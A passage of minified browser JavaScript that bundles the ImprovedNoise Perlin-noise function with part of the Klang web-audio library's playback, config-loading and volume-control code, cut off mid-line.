var ImprovedNoise=function(){function r(r){return r*r*r*(r*(6*r-15)+10)}function n(r,n,o){return n+r*(o-n)}function o(r,n,o,e){var t=15&r,u=8>t?n:o,i=4>t?o:12==t||14==t?n:e;return(0==(1&t)?u:-u)+(0==(2&t)?i:-i)}for(var e=[151,160,137,91,90,15,131,13,201,95,96,53,194,233,7,225,140,36,103,30,69,142,8,99,37,240,21,10,23,190,6,148,247,120,234,75,0,26,197,62,94,252,219,203,117,35,11,32,57,177,33,88,237,149,56,87,174,20,125,136,171,168,68,175,74,165,71,134,139,48,27,166,77,146,158,231,83,111,229,122,60,211,133,230,220,105,92,41,55,46,245,40,244,102,143,54,65,25,63,161,1,216,80,73,209,76,132,187,208,89,18,169,200,196,135,130,116,188,159,86,164,100,109,198,173,186,3,64,52,217,226,250,124,123,5,202,38,147,118,126,255,82,85,212,207,206,59,227,47,16,58,17,182,189,28,42,223,183,170,213,119,248,152,2,44,154,163,70,221,153,101,155,167,43,172,9,129,22,39,253,19,98,108,110,79,113,224,232,178,185,112,104,218,246,97,228,251,34,242,193,238,210,144,12,191,179,162,241,81,51,145,235,249,14,239,107,49,192,214,31,181,199,106,157,184,84,204,176,115,121,50,45,127,4,150,254,138,236,205,93,222,114,67,29,24,72,243,141,128,195,78,66,215,61,156,180],t=0;256>t;t++)e[256+t]=e[t];return{noise:function(t,u,i){var v=~~t,f=~~u,a=~~i,c=255&v,s=255&f,d=255&a;t-=v,u-=f,i-=a;var m=t-1,p=u-1,I=i-1,N=r(t),l=r(u),x=r(i),b=e[c]+s,g=e[b]+d,h=e[b+1]+d,j=e[c+1]+s,k=e[j]+d,q=e[j+1]+d;return n(x,n(l,n(N,o(e[g],t,u,i),o(e[k],m,u,i)),n(N,o(e[h],t,p,i),o(e[q],m,p,i))),n(l,n(N,o(e[g+1],t,u,I),o(e[k+1],m,u,i-1)),n(N,o(e[h+1],t,p,I),o(e[q+1],m,p,I))))}}};module.exports=ImprovedNoise;
},{}],124:[function(require,module,exports){
!function(t,e){t.Klang=t.Klang||e(),"function"==typeof define&&define.amd?define(function(){return t.Klang}):"object"==typeof exports&&(module.exports=t.Klang)}(window,function(){if(-1!=navigator.userAgent.indexOf("MSIE")){var t,e=navigator.userAgent,i=new RegExp("MSIE ([0-9]{1,}[.0-9]{0,})");null!=i.exec(e)&&(t=parseInt(RegExp.$1)),9>t&&(Object.oldDefineProperty=Object.defineProperty,Object.defineProperty=function(){})}!function(){"use strict";function t(t){t&&(t.setTargetValueAtTime||(t.setTargetValueAtTime=t.setTargetAtTime))}var e=window.AudioContext=window.AudioContext||window.webkitAudioContext||window.mozAudioContext,i=function(){var t,e=navigator.userAgent,i=e.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)||[];return/trident/i.test(i[1])?(t=/\brv[ :]+(\d+)/g.exec(e)||[],{name:"IE",version:t[1]||"unknown"}):"Chrome"===i[1]&&(t=e.match(/\bOPR\/(\d+)/),null!==t)?{name:"Opera",version:t[1]}:(i=i[2]?[i[1],i[2]]:[navigator.appName,navigator.appVersion,"-?"],null!==(t=e.match(/version\/(\d+)/i))&&i.splice(1,1,t[1]),{name:i[0],version:i[1]})}();if(e){var n=e.prototype,s=new e;n.hasOwnProperty("createGain")||(n.createGain=n.createGainNode),n.hasOwnProperty("internal_createBiquadFilter")||(n.internal_createBiquadFilter=n.createBiquadFilter,n.createBiquadFilter=function(){var e=this.internal_createBiquadFilter();t(e.frequency),t(e.detune),t(e.Q),t(e.gain);for(var i=["LOWPASS","HIGHPASS","BANDPASS","LOWSHELF","HIGHSHELF","PEAKING","NOTCH","ALLPASS"],n=0;n<i.length;++n){var s=i[n],o=s.toLowerCase();!e.hasOwnProperty(s)||Object.isFrozen&&Object.isFrozen(e)||(e[s]=o)}return e}),n.hasOwnProperty("createDelay")||(n.createDelay=n.createDelayNode);var o=function(t,e){return void 0===t&&void 0!==e},r=s.createBufferSource().constructor.prototype;if(o(r.start,r.noteOn)||o(r.stop,r.noteOff)){var a=n.createBufferSource;n.createBufferSource=function(){var t=a.call(this);return t.start=t.start||t.noteOn,t.stop=t.stop||t.noteOff,t}}if("function"==typeof s.createOscillator){var u=s.createOscillator().constructor.prototype;if(o(u.start,u.noteOn)||o(u.stop,u.noteOff)){var c=n.createOscillator;n.createOscillator=function(){var t=c.call(this);return t.start=t.start||function(){t.noteOn&&(arguments.length>1?t.noteGrainOn.apply(t,arguments):t.noteOn.apply(t,arguments))},t.stop=t.stop||t.noteOff,t}}}void 0===n.createGain&&void 0!==n.createGainNode&&(n.createGain=n.createGainNode),void 0===n.createDelay&&void 0!==n.createDelayNode&&(n.createDelay=n.createDelayNode),void 0===n.createScriptProcessor&&void 0!==n.createJavaScriptNode&&(n.createScriptProcessor=n.createJavaScriptNode);var h=window.AudioParam=window.AudioParam||window.webkitAudioParam;if(h){var l=window.AudioParam.prototype;l.setTargetAtTime=l.setTargetAtTime||l.setTargetValueAtTime}else e.prototype.internal_createGain||(e.prototype.internal_createGain=e.prototype.createGain,e.prototype.createGain=function(){var e=this.internal_createGain();return t(e.gain),e});if("Chrome"==i.name){var p=window.AudioBufferSourceNode.prototype;p.internal_start||(p.internal_start=p.start,p.start=function(t,e,i){p.internal_start.call(this,t)})}}}();var n,s=this.__extends||function(t,e){function i(){this.constructor=t}i.prototype=e.prototype,t.prototype=new i};return function(t){function e(t){G=G||{},G[t]=arguments}function i(e){for(var i=[],n=0;n<arguments.length-1;n++)i[n]=arguments[n+1];if(R.isInited)try{if("webaudio"===t.version){if(!t.context)return;R.instance.triggerEvent(e,i)}else"audiotag"===t.version&&t.audioTagHandler&&t.audioTagHandler.triggerEvent(e,i)}catch(s){t.err("Klang exception: unable to trigger event: '"+e+"': "+s.name+": "+s.message)}}function n(e){var i=R.instance.findInstance(t.getEvents()[e]);return i?i.destination():null}function o(){if(G){for(var e in G)G.hasOwnProperty(e)&&t.triggerEvent.apply(t,G[e]);G=null}}function r(e,i,n,s,r){if(t.initOptions=r=r||{},t.isMobile=U.checkMobile(),t.isIOS=U.checkIOS(),t.useMonoBuffers=t.isIOS,"object"==typeof e&&e.settings&&e.settings.force_logging&&(t.loggingEnabled=!0),t.klangInited)return void t.warn("Klang already initialized");t.klangInited=!0,t.readyState=t.READY_STATE_NOT_INITIATED;var a="webaudio"===r.forceMode||!r.forceMode&&void 0!==window.AudioContext;"audiotag"===r.forceMode||!r.forceMode&&!window.AudioContext;if(!a){t.version="audiotag";try{t.audioTagHandler=new q(e,function(e){t.readyState=t.READY_STATE_LOADED,i&&i(e),o()},n)}catch(u){return t.err("Klang exception: unable to initialize audio tag fallback"),t.version="failed audiotag",i(!1),!1}return!0}t.context||(t.context=new AudioContext);try{return t.version="webaudio",R.isInited()&&t.warn("Klang already initialized"),R.instance.loadJSON(e,function(e){t.readyState=t.READY_STATE_LOADED,i&&i(e),o()},n),!0}catch(u){return t.err("Klang exception: unable to parse config file: '"+e+"': "+u.name+": "+u.message),t.version="failed web audio",i(!1),!1}}function a(){if("webaudio"==t.version)try{R.instance.initIOS()}catch(e){t.err("Klang exception: unable to init iOS: "+e.name+": "+e.message)}else"audiotag"==t.version&&t.isMobile&&t.audioTagHandler.initIOS()}function u(){var e,i=[];if("webaudio"===t.version)e=B.FileHandler.instance;else{if("audiotag"!==t.version)return[];e=t.audioTagHandler}i=e.getLoadGroups();var n=i.indexOf("auto");return-1!==n&&i.splice(n,1),i}function c(){return R.instance}function h(){return B.FileHandler.instance}function l(){return U}function p(){return B}function _(e,i){return"webaudio"!==t.version?(t.err("Schedule only availible in WebAudio version"),this):("number"==typeof e&&"function"==typeof i?R.instance.scheduler.at(e,i):t.err(".schedule requires arg0 - time in seconds and arg1 - a callback function"),this)}function f(t,e){if(!B[t])throw new Error("No such object");return new B[t](e)}function d(t,e){R.debugSettings[t]=e}function g(e,i,n,s){try{t.logc("Klang: Loading: '"+e+"'",U.LOG_LOAD_COLOR),"webaudio"==t.version?R.instance.loadSoundFiles(e,i,n,s):"audiotag"==t.version?t.audioTagHandler.loadSoundFiles(e,i,n,s):(n&&n(1),i&&i(!1))}catch(o){t.err("Klang exception: unable to load file group: '"+e+"': "+o.name+": "+o.message)}}function y(e){try{t.logc("Klang: Freeing: '"+e+"'",U.LOG_LOAD_COLOR),"webaudio"==t.version?R.instance.freeSoundFiles(e):"audiotag"==t.version}catch(i){t.err("Klang exception: unable to free file group: '"+e+"': "+i.name+": "+i.message)}}function m(){return B.FileHandler.instance.progress}function v(){"webaudio"==t.version?R.isInited()&&R.instance.stopAll():"audiotag"==t.version&&t.audioTagHandler.stopAll()}function b(e,i){if("webaudio"==t.version){if(R.isInited()){if(0===e.indexOf(".")){var n=e.substring(1),s=[],o=t.getCoreInstance()._objectTable;for(var r in o)if(o.hasOwnProperty(r)){var a=o[r];a._type===n&&s.push(a)}return s}var u=R.instance.getSymbolId(e);return R.instance.findInstance(u)}}else"audiotag"==t.version}function T(){for(var e=[],i=0;i<arguments.length-0;i++)e[i]=arguments[i+0];t.loggingEnabled&&("Chrome"==t.browser?console.log("%c["+E()+"] "+e.join(),"color:"+U.LOG_TIME_COLOR):console.log.apply(console,e))}function S(e,i){t.loggingEnabled&&("Chrome"==t.browser?(i||(i="gray"),console.log("%c["+E()+"] "+e,"color:"+i)):console.log(e))}function O(){for(var e=[],i=0;i<arguments.length-0;i++)e[i]=arguments[i+0];t.loggingEnabled&&("Chrome"==t.browser?console.warn("%c["+t.getTimeString()+"] "+e.join(),"color:"+U.LOG_WARN_COLOR):console.warn.apply(console,e))}function P(){for(var e=[],i=0;i<arguments.length-0;i++)e[i]=arguments[i+0];t.loggingEnabled&&("Chrome"==t.browser?console.warn("%c["+t.getTimeString()+"] "+e.join(),"color:"+U.LOG_ERROR_COLOR):console.warn.apply(console,e))}function A(t,e){for(var i=t.toString();i.length<e;)i="0"+i;return i}function w(t){return A(t.getUTCMinutes(),2)+":"+A(t.getUTCSeconds(),2)+"."+A(t.getUTCMilliseconds(),3)}function E(e){void 0==e&&(e=t.context.currentTime);var i=Math.round(1e3*e),n=Math.floor(i/1e3%60),s=Math.floor(i/6e4%60),o=Math.floor(i/36e5%24);return A(o,2)+":"+A(s,2)+":"+A(n,2)+"."+A(i%1e3,3)}function x(){return"flash"===t.version?null:"audiotag"==t.version?t.audioTagHandler._events:R.instance._eventTable}function k(t){R.instance.setCallbacks(t)}function F(e){var n=0,s=setInterval(function(){for(var o=t.context.currentTime,r=e[n];r.time<o;){if(i(r.name,r.args),n++,n==e.length){clearInterval(s);break}r=e[n]}},10)}function C(e,i){t.klangInited=!1,"webaudio"==t.version?R.isInited()&&(R.instance.stopAll(),R.deinit()):"audiotag"==t.version&&t.audioTagHandler.stopAll(),t.version="n/a"}!function(t){function e(){var t=window.document.createElement("audio");if(!t.canPlayType)return!1;var e=[];return t.canPlayType('audio/ogg; codecs="vorbis"').replace(/no/,"")&&e.push(".ogg"),t.canPlayType("audio/aac").replace(/no/,"")&&e.push(".m4a"),t.canPlayType("audio/mpeg;").replace(/no/,"")&&e.push(".mp3"),e}function i(t){s=s||e();for(var i=0;i<s.length;i++)if(s[i]===t)return!0;return!1}function n(){var t,e=navigator.userAgent,i=e.match(/(edge(?=\/))\/?\s*(\d+)/i)||[];return 0==i.length&&(i=e.match(/(edge|opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)||[]),/trident/i.test(i[1])?(t=/\brv[ :]+(\d+)/g.exec(e)||[],{name:"IE",version:t[1]||"unknown"}):"Chrome"===i[1]&&(t=e.match(/\bOPR\/(\d+)/),null!==t)?{name:"Opera",version:t[1]}:(i=i[2]?[i[1],i[2]]:[navigator.appName,navigator.appVersion,"-?"],null!==(t=e.match(/version\/(\d+)/i))&&i.splice(1,1,t[1]),{name:i[0],version:i[1]})}var s;t.canPlayAudioSuffix=i,t.browser=n()}(t.detector||(t.detector={}));t.detector;!function(e){function i(t){var e=document.createElement("a");e.href=t;var i=document.createElement("a");i.href=location.href;var n=""!=e.hostname&&(e.port!=i.port||e.protocol!=i.protocol||e.hostname!=i.hostname);return n}function n(e,i,n,s){var o;if(e.type=e.type||"GET","MSIE"==t.detector.browser.name&&t.detector.browser.version<10)o=new window.XDomainRequest,o.onload=function(){setTimeout(function(){i&&i(o.responseText)},10)},o.onprogress=n||function(){},o.onerror=s||function(){},o.open(e.type,e.url,!0);else{if(!window.XMLHttpRequest)throw"Error - browser does not support XDomain/XMLHttp Requests";o=new XMLHttpRequest,o.open(e.type,e.url,!0),o.onreadystatechange=function(){try{if(4==o.readyState&&200==o.status){if(i){var t=o.responseText;i(t)}}else 0!=o.status&&200!=o.status&&s&&s({status:o.status})}catch(e){throw e}}}o&&o.send(null)}e.isCrossDomain=i,e.request=n}(t.network||(t.network={}));var I=t.network;t.audioTagHandler;var V=function(){function t(e,i){this._url=e,this.data=i,this._onCanPlayThrough=this._onCanPlayThrough.bind(this),this._waitForReadyState=this._waitForReadyState.bind(this),this.state=t.STATE_NOT_LOADED}return t.STATE_NOT_LOADED=0,t.STATE_LOADING=1,t.STATE_LOADED=2,t.prototype._onCanPlayThrough=function(){this.audioElement.removeEventListener("canplaythrough",this._onCanPlayThrough,!1),this._waitForReadyState(function(){this.ready=!0,this.state=this.state=t.STATE_LOADED,this._readyCallback&&this._readyCallback(),this.audioElement.pause()}.bind(this))},t.prototype._waitForReadyState=function(t){var e=this;!function i(){e.audioElement.readyState?t&&t():setTimeout(i,100)}()},t.prototype.load=function(e){if(this.state===t.STATE_NOT_LOADED){this.state=t.STATE_LOADING;var i=this.audioElement=new Audio;i.src=this._url,i.addEventListener("canplaythrough",this._onCanPlayThrough,!1),i.volume=0,i.play()}this._readyCallback=e},t.prototype.clone=function(){var e=new t(this._url,this.data);return e.state=this.state,e.audioElement=new Audio,e.ready=!!this.ready,e.audioElement.src=this._url,e.audioElement.volume=0,e.audioElement.play(),e},t}();t.ATAudioFile=V;var D=function(){function e(t,i){this._xLoopTimer=0,this.state=e.STATE_STOPPED,this._data=t,this._currentFile=i,this._retrig=void 0===t.retrig?!0:t.retrig,this._loopStart=t.loop_start||0,this._loopEnd=t.loop_end||0,this._destination_name=t.destination_name,this._currentFile&&(this._priority=this._currentFile.data.audio_tag,this._loop=!!this._data.loop,this._gain=new N(t.volume,this),this.beforeEnding=this.beforeEnding.bind(this))}return e.STATE_PLAYING=3,e.STATE_STOPPING=3,e.STATE_STOPPED=4,e.prototype.beforeEnding=function(){if(this._playing&&this._loop){var t=this._currentFile;this._currentFile=t===this._files[0]?this._files[1]:this._files[0],this._currentFile.currentTime=0,this._currentFile.audioElement.currentTime=0,this.setVolume(),this._currentFile.audioElement.play(),clearTimeout(this._xLoopTimer),this._xLoopTimer=setTimeout(this.beforeEnding,1e3*(this._currentFile.audioElement.duration-this._loopStart-(this._loopEnd?this._currentFile.audioElement.duration-this._loopEnd:0)))}},e.prototype.play=function(t,i,n,s,o){if(t=t||0,!this._currentFile.ready)return this;if(this._playing&&!this._retrig&&this.state!==e.STATE_STOPPING)return this;if(t>0){var r=this;this._playTimeout=setTimeout(function(){r.doPlay(i,n,s,o)},1e3*t)}else this.doPlay(i,n,s,o)},e.prototype.doPlay=function(t,i,n,s){return t=t||0,this.state!=e.STATE_STOPPING||this._retrig?(n||this.getOutput().setVolume(this.getOutput().getVolume()),this._currentFile.audioElement.currentTime=0,this._currentFile.audioElement.play(),this._playing=!0,this._loop&&(this._files||(this._files=[this._currentFile,this._currentFile.clone()]),clearTimeout(this._xLoopTimer),this._xLoopTimer=setTimeout(this.beforeEnding,1e3*(this._currentFile.audioElement.duration-t-this._loopStart-(this._loopEnd?this._currentFile.audioElement.duration-this._loopEnd:0)))),this.state=e.STATE_PLAYING,this):(this.getOutput().fadeVolume(this.getOutput().getVolume(),.5),void(this.state=e.STATE_PLAYING))},e.prototype.fadeInAndPlay=function(t,e,i,n){if(i=i||0,i>0){var s=this;this._playTimeout=setTimeout(function(){s.doFadeInAndPlay(s.getOutput().getVolume(),e)},1e3*i)}else this.doFadeInAndPlay(this.getOutput().getVolume(),e);return this},e.prototype.doFadeInAndPlay=function(t,i){return this._gain.setVolume(this.state==e.STATE_PLAYING?this._gain.getVolume():0),this.play(0,0,!1,!0),this._gain.fadeVolume(t,i),this},e.prototype.stop=function(t){return this._playTimeout&&clearTimeout(this._playTimeout),this.state=e.STATE_STOPPED,this._currentFile.audioElement&&this._currentFile.audioElement.pause(),this._playing=!1,clearTimeout(this._xLoopTimer),this},e.prototype.fadeOutAndStop=function(t,i){this._playTimeout&&clearTimeout(this._playTimeout);var n=this;return this._gain.fadeVolume(0,t,function(){n.state==e.STATE_STOPPING&&n.stop()}),this.state=e.STATE_STOPPING,this},e.prototype.setVolume=function(e){return e=void 0===e?this.getOutput().getVolume():e,e=Math.max(0,Math.min(1,e*this._destination.calcVolume()*t.audioTagHandler.getGlobalVolume()*t.audioTagHandler.getFocusBlurVolume())),this._currentFile.audioElement&&isFinite(e)&&(this._currentFile.audioElement.volume=e),this},e.prototype.update=function(){this.setVolume(this._destination.calcVolume())},e.prototype.connect=function(t){this._destination=t,t.addConnected(this),this.update()},e.prototype.getOutput=function(){return this._gain},Object.defineProperty(e.prototype,"position",{get:function(){return this.playing?this._currentFile.audioElement.currentTime:0},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"playing",{get:function(){return this._playing},enumerable:!0,configurable:!0}),e}();t.ATAudioSource=D;var M=function(){function e(e){this._data=e,this._destination_name=e.destination_name,this._content=[];for(var i in this._data.content){var n=t.audioTagHandler.getObject(this._data.content[i]);n&&this._content.push(n)}}return e.prototype.play=function(t,e,i){var n="number"==typeof e?e:U.random(this._content.length-1,0);return this._content[n]&&this._content[n].play(t),this},e.prototype.stop=function(){for(var t in this._content)this._content[t]&&this._content[t].stop();return this},Object.defineProperty(e.prototype,"playing",{get:function(){var t=!1;for(var e in this._content)this._content[e]._playing&&(t=!0);return t},enumerable:!0,configurable:!0}),e.prototype.update=function(){for(var t in this._content)this._content[t]&&this._content[t].setVolume(this._destination.calcVolume())},e.prototype.connect=function(t){for(var e in this._content)this._content[e]&&this._content[e].connect(t)},e}();t.ATAudioGroup=M;var N=function(){function t(t,e){this._currentVolume=this._volume=void 0!=t?t:1,this._currentVolume=Math.max(0,Math.min(this._currentVolume,1)),this._owner=e}return t.prototype.getVolume=function(){return this._volume},t.prototype.setVolume=function(t){return t=Math.max(0,Math.min(1,t)),this._currentVolume=t,this._owner&&this._owner.setVolume&&this._owner.setVolume(this._currentVolume),this},t.prototype.fadeVolume=function(t,e,i){this._fadeTimer&&clearInterval(this._fadeTimer);var n=this;return this._fadeSteps=Math.round(1e3*e)/10,this._volumeStep=(this._currentVolume-t)/this._fadeSteps,this._fadeTimer=setInterval(function(){n.setVolume(n._currentVolume-n._volumeStep),n._fadeSteps--,n._fadeSteps<=0&&(clearInterval(n._fadeTimer),i&&i())},10),this},t.prototype.resetVolume=function(t){var e=t?this._currentVolume:this._volume;return clearInterval(this._fadeTimer),this.setVolume(e),this},t}();t.ATGainNode=N;var L=function(){function t(t,e,i){this._isMaster=!1,this._connected=[],this._isMaster=i,this._data=t,this._name=e,this._output=new N(void 0!=t.output_vol?t.output_vol:1,this),this._volume=void 0!=t.output_vol?t.output_vol:1,this._destination_name=t.destination_name}return t.prototype.getVolume=function(){return this._isMaster?this._volume:this._volume},t.prototype.calcVolume=function(t){return"undefined"==typeof t&&(t=1),t*=this._volume,this._destination?this._destination.calcVolume(t):t},t.prototype.setVolume=function(t){this._volume=t;for(var e=0;e<this._connected.length;e++)this._connected[e].update()},t.prototype.update=function(){for(var t=0;t<this._connected.length;t++)this._connected[t].update()},t.prototype.getOutput=function(){return this._output},t.prototype.addConnected=function(t){this._connected.push(t)},t.prototype.connect=function(t){this._destination=t,t.addConnected(this)},t}();t.ATBus=L;var j=function(){function e(t,e,i){this._data=t,this._name=e,this._vars=i,"copy"===this._data.at_action&&(this._data.at_action=this._data.action)}return e.prototype.start=function(e){try{new Function("Util","me","args",this._data.at_action)(U,this._vars,e)}catch(i){t.err("Klang: error in process '"+this._name+"': "+i.name+": "+i.message)}},e}();t.ATProcess=j;var q=function(){function e(e,i,n){if(this._loadedFiles=0,this._audioFiles={},this._limitSounds=t.isMobile||"Opera"==t.detector.browser.name,"string"==typeof e){var s=this;I.request({url:e},function(o){try{s.init(JSON.parse(o),i,n,e)}catch(r){t.version="n/a",i&&i(!1)}},null,function(e){t.err(e)})}else"object"==typeof e?this.init(e):t.err("Klang exception: unrecognized config type: "+typeof e)}return e.prototype.init=function(e,i,n,s){function o(){r.isHidden()?r._blurFadeOut&&r.setFocusBlurVolume(0):r.setFocusBlurVolume(1)}var r=this;this._globalVolume=1,this._focusBlurVolume=1,this._readyCallback=i,this._progressCallback=n,this._events=e.events;var a,u=parseInt(e.settings.relative_path),c=e.settings.file_path||"";u&&-1!=s.lastIndexOf("/")?(a=s.substring(0,s.lastIndexOf("/")),"/"!==a.charAt(a.length-1)&&(a+="/"),a+=c):a=c;var h=".mp3";("Firefox"==t.detector.browser.name||"Chrome"==t.detector.browser.name)&&(h=".ogg");for(var l in e.files){var p=e.files[l],_=p.audio_tag;!_||this._limitSounds&&1!=_||(this._audioFiles[p.id]=new V(a+p.url+h,p))}this._masterBus=e.masterBus,this._busses={};for(var f in e.busses)this._busses[f]=new L(e.busses[f],f,f==this._masterBus);this._audio={};for(var d in e.audio)if(e.audio.hasOwnProperty(d)){var g=e.audio[d];if("AudioSource"==g.type){if(this._audioFiles[g.file_id]){this._audioFiles[g.file_id];this._audio[d]=new D(g,this._audioFiles[g.file_id])}}else"AudioGroup"==g.type&&(this._audio[d]=new M(g))}for(var y in this._busses)y!=this._masterBus&&this._busses[y].connect(this._busses[this._busses[y]._destination_name]);for(var m in this._audio)this._audio[m].connect(this._busses[this._audio[m]._destination_name]);this._processes={};for(var l in e.processes){var v=e.processes[l];if(v.at_action){var b={};for(var T in v.vars){var S=v.vars[T];b[S]=this._audio[S]||this._busses[S]}this._processes[l]=new j(v,l,b)}}if(this.loadSoundFiles(["auto","autotag"],i,n),-1!=e.settings.blur_fade_time){this._blurFadeOut=!0;var r=(e.settings.blur_fade_time||.5,this),O=this.getHiddenProp();if(O){var P="visibilitychange";document.addEventListener(P,o)}}},e.prototype.fadeBusVolume=function(t,e,i){var n=this._busses[t._name];n.getOutput().fadeVolume(e,i)},e.prototype.isHidden=function(){var t=this.getHiddenProp();return t?document[t]:!1},e.prototype.getHiddenProp=function(){var t=["webkit","moz","ms","o"];if("hidden"in document)return"hidden";for(var e=0;e<t.length;e++)if(t[e]+"Hidden"in document)return t[e]+"Hidden";return null},e.prototype.initIOS=function(){if(t.isIOS||t.isMobile)for(var e in this._audioFiles)this._audioFiles[e].load()},e.prototype.loadSoundFiles=function(t,e,i,n){e&&(this._readyCallback=e),i&&(this._progressCallback=i),"string"==typeof t&&(t=[t]),this._loadedFiles=0,this._numFiles=0;var s=this;for(var o in this._audioFiles)if(this._audioFiles.hasOwnProperty(o)){var r=this._audioFiles[o],a=r.data.load_group;(void 0==t||-1!=t.indexOf(a))&&r.state===V.STATE_NOT_LOADED&&(this._numFiles++,r.load(function(){s.loadProgress()}))}0==this._numFiles&&this._readyCallback&&this._readyCallback(!0)},e.prototype.getLoadGroups=function(){var t,e=this._audioFiles||[],i={},n=[];for(t in e){var s=e[t];i[s.data.load_group]=s.data.load_group}for(t in i)n.push(t);return n},e.prototype.loadProgress=function(){if(this._loadedFiles++,this._progressCallback&&this._progressCallback(this._loadedFiles/this._numFiles*100),this._readyCallback&&this._loadedFiles==this._numFiles){var t=this;setTimeout(function(){t._readyCallback(!0)},200)}},e.prototype.triggerEvent=function(e,i){for(var n="",s=0;s<i.length;s++)n+=i[s]+", ";if("sound_position"!=e){var o="";i&&(o=i[0])}if(this._events)try{var r=this._events[e];if("string"==typeof r){var a=this._processes[r];a&&a.start(i)}else if(r)for(var u=0,c=r.length;c>u;u++){var h=r[u],a=this._processes[h];a&&a.start(i)}}catch(l){t.err("Klang: error when triggering event '"+e+"': "+l.name+": "+l.message)}},e.prototype.getFocusBlurVolume=function(){return this._focusBlurVolume},e.prototype.setFocusBlurVolume=function(t){t=Math.max(0,Math.min(t,1)),this._focusBlurVolume=t;for(var e in this._audio){var i=this._audio[e];if(i&&i.setVolume&&i.getOutput()){var n=i.getOutput();n&&i.setVolume(n.getVolume())}}},e.prototype.getGlobalVolume=function(){return this._globalVolume},e.prototype.setGlobalVolume=function(t){t=Math.max(0,Math.min(t,1)),this._globalVolume=t;for(var e in this._audio){var i=this._audio[e];if(i&&i.setVolume&&i.getOutput){var n=i.getOutput();n&&i.setVolume(n.getVolume())}}},e.prototype.fadeGlobalVolume=function(t,e){t=Math.max(0,Math.min(t,1)),this._globalFadeTimer&&clearInterval(this._globalFadeTimer);var i=this,n=Math.round(1e3*e)/10,s=(this._globalVolume-t)/n;this._globalFadeTimer=setInterval(function(){i._globalVolume=i._globalVolume-s,n--;for(var t in i._audio){var e=i._audio[t];e&&e.setVolume&&e.getOutput&&e.setVolume()}0>=n&&clearInterval(i._globalFadeTimer)},10)},e.prototype.getLimitSounds=function(){return this._limitSounds},e.prototype.stopAll=function(t){for(var e in this._audio)(void 0==t||this._audio[e]._priority==t)&&this._audio[e].stop();return this.stopPeriodic(),this},e.prototype.getObject=function(t){return this._audioFiles[t]||this._audio[t]},e.prototype.playPeriodic=function(t,e,i){clearTimeout(this._periodicTimer);var n=this;this._periodicTimer=setTimeout(function(){t.play(),n.playPeriodic(t,e,i)},U.random(1e3*e,1e3*i))},e.prototype.stopPeriodic=function(){clearTimeout(this._periodicTimer)},e}();t.AudioTagHandler=q,t.versionNumber=1,t.context,t.version,t.progressCallback,t.readyCallback,t.browser,t.os,t.isMobile,t.isIOS,t.fallback,t.loggingEnabled=!1,t.useMonoBuffers=!1,t.Panner,t.safari=!1,t.initOptions;var R=function(){function e(){this._initComplete=!1,this._blurFadeOut=!1,this._masterBusId=null,this._preLoadInitStack=[],this._postLoadInitStack=[],this._connectStack=[],this._superMasterOutput=t.context?t.context.createGain():null,t.Panner=B.Panner,this._eventHistory=[],this.scheduler=new B.Scheduler,U.getParameterByName("klang_log")&&(t.loggingEnabled=!0)}return e.debugSettings={},e.inst=null,e.isInited=function(){return null==e.inst?!1:e.inst._initComplete},Object.defineProperty(e.prototype,"initComplete",{get:function(){return this._initComplete},enumerable:!0,configurable:!0}),Object.defineProperty(e,"instance",{get:function(){return null==e.inst&&(e.inst=new e),e.inst},enumerable:!0,configurable:!0}),e.prototype.setCallbacks=function(t){this._callbacks=t},Object.defineProperty(e,"callbacks",{get:function(){return e.instance._callbacks},enumerable:!0,configurable:!0}),e.deinit=function(){e.inst=null},e.prototype.stopAll=function(){window.KlangVisual&&KlangVisual.stop();for(var t in this._objectTable)if(this._objectTable[t].stop)try{this._objectTable[t].stop()}catch(e){}},e.prototype.loadJSON=function(i,n,s){if(this._readyCallback=n,this._progressCallback=s||function(){},"object"==typeof i){t.log("Loading config (editor)");var o=this.createConfigNode(i);e.settings=o.settings,e.instance.initContent(o),window.KlangVisual&&KlangVisual.init(i)}else{if("string"!=typeof i)throw"Klang exception: unrecognized options: '"+i+"'";t.log("Loading config (client)");var r=new XMLHttpRequest;r.open("GET",i,!0);var a=this;r.onreadystatechange=function(){if(4==r.readyState&&200==r.status){var t=r.responseText,n=a.parseConfigJSON(t);e.settings=n.settings,e.instance.initContent(n,null,i),window.KlangVisual&&KlangVisual.init(JSON.parse(t))}else{if(404==r.status)throw"Klang exception: config file not found: '"+i+"'";if(200!=r.status)throw"Klang exception: unable to load config file: '"+i+"'"}},r.send(null)}},e.prototype.parseConfigJSON=function(e){return JSON.parse(e,function(e,i){return i&&"object"==typeof i&&"string"==typeof i.type?(B[i.type]||t.warn("Core: Type not found: "+i.type),new B[i.type](i,e)):i})},e.prototype.createConfigNode=function(e){if("object"==typeof e)for(var i in e){var n=e[i];"object"==typeof n&&"string"==typeof n.type?(B[n.type]||t.warn("Core: Type not found: "+n.type),e[i]=this.createConfigNode(n),e[i]=new B[n.type](n,i)):e[i]=this.createConfigNode(n)}return e},e.prototype.createObject=function(e,i,n){n||(n={}),B[i.type]||t.warn("Core: Type not found: "+i.type),!n.excludeFromTable&&this._objectTable[e]&&t.warn("Core: Duplicate object: "+e);var s=new B[i.type](i,e);if(n.excludeFromTable||(this._objectTable[e]=s),!n.noInit&&s.init&&s.init(),!n.noConnect&&s.destinationName&&s.connect)if("$OUT"==s.destinationName)s.connect(this._superMasterOutput);else{var o=this.findInstance(s.destinationName);o||t.warn("Core: Destination not found: "+s.destinationName),"Bus"!=o._type&&t.warn("Core: Destination is not a bus: "+s.destinationName),s.connect(o.input)}return s},e.prototype.updateObject=function(t,e){var i="string"==typeof t?this._objectTable[t]:t;if("SimpleProcess"==i._type&&"AdvancedProcess"==e.type){var n=new B.AdvancedProcess(e,t);n.init(),this._objectTable[t]=n}else if("AdvancedProcess"==i._type&&"SimpleProcess"==e.type){var s=new B.SimpleProcess(e,t);s.init(),this._objectTable[t]=s}else i.setData&&i.setData(e)},e.prototype.createEvent=function(e,i){this._eventTable[e]&&t.warn("Core: Duplicate event: "+e),this._eventTable[e]=i},e.prototype.initContent=function(i,n,s){function o(){h.isHidden()?h._blurFadeOut&&U.curveParamLin(h._superMasterOutput.gain,0,c):U.curveParamLin(h._superMasterOutput.gain,1,c)}var r,a=i.settings.relative_path,u=i.settings.file_path||"";a&&-1!=s.lastIndexOf("/")?(r=s.substring(0,s.lastIndexOf("/")),"/"!==r.charAt(r.length-1)&&(r+="/"),r+=u):r=u,t.log("Initializing 